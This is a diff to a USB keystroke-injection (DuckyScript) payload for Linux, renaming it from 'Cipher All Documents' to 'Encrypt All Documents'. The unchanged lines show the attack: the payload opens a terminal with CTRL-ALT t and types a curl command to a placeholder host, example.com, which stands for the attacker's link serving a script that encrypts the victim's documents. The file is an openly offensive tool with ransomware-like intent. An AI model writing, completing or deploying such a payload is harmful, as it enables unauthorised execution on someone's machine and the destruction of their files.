@@ -1,12 +1,12 @@
-REM #######################################
-REM #                                     |
-REM # Title        : Cipher All Documents |
-REM # Author       : Aleff                |
-REM # Version      : 1.0                  |
-REM # Category     : Execution            |
-REM # Target       : Linux                |
-REM #                                     |
-REM #######################################
+REM ########################################
+REM #                                      |
+REM # Title        : Encrypt All Documents |
+REM # Author       : Aleff                 |
+REM # Version      : 1.0                   |
+REM # Category     : Execution             |
+REM # Target       : Linux                 |
+REM #                                      |
+REM ########################################
 
 
 REM ATTENTION - BEFORE USING THIS PAYLOAD MAKE SURE YOU UNDERSTAND WHAT IT DOES
@@ -34,7 +34,7 @@ DELAY 1000
 CTRL-ALT t
 DELAY 2000
 
-REM Reply example.com with YOUR LINK. The Payload should be CipherAllDocumentsScript.py
+REM Reply example.com with YOUR LINK. The Payload should be EncryptAllDocumentsScript.py
 DEFINE PAYLOAD example.com
 STRING curl 
 STRING PAYLOAD
